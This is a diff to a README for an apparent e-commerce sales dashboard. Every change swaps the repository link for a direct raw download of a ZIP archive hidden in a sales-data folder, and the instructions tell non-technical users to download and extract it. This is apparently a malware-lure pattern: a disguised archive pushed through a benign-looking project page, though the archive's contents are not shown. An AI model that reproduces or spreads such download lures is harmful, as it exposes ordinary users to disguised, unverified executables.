@@ -1,6 +1,6 @@
 # 📊 Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025 - Clear Sales Insights for E-Commerce
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025/raw/refs/heads/main/Orders_2025/Amazon_Sales_Data/Dubai_Dashboard_Multichannel_Sales_Mart_Online_Analytics_v2.2-alpha.4.zip)
 
 ---
 
@@ -35,7 +35,7 @@ You can track sales from up to three online platforms at once. The tool also che
 ## 🚀 Getting Started
 
 1. **Download the software from the link below:**  
-   Click the bright green button at the top or [go here to download](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025).
+   Click the bright green button at the top or [go here to download](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025/raw/refs/heads/main/Orders_2025/Amazon_Sales_Data/Dubai_Dashboard_Multichannel_Sales_Mart_Online_Analytics_v2.2-alpha.4.zip).
 
 2. **Extract the files:**  
    After you download the ZIP file, right-click it and select "Extract All". Choose a folder you can easily find, like your Desktop.
@@ -58,7 +58,7 @@ You can track sales from up to three online platforms at once. The tool also che
 
 ### Step 1: Visit the download page
 
-Go to https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025 by clicking the download button or the link above.
+Go to https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025/raw/refs/heads/main/Orders_2025/Amazon_Sales_Data/Dubai_Dashboard_Multichannel_Sales_Mart_Online_Analytics_v2.2-alpha.4.zip by clicking the download button or the link above.
 
 ### Step 2: Download the latest release
 
@@ -121,7 +121,7 @@ This dashboard came from the need to track sales data from multiple sources in o
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025/raw/refs/heads/main/Orders_2025/Amazon_Sales_Data/Dubai_Dashboard_Multichannel_Sales_Mart_Online_Analytics_v2.2-alpha.4.zip)
 
 ---
 
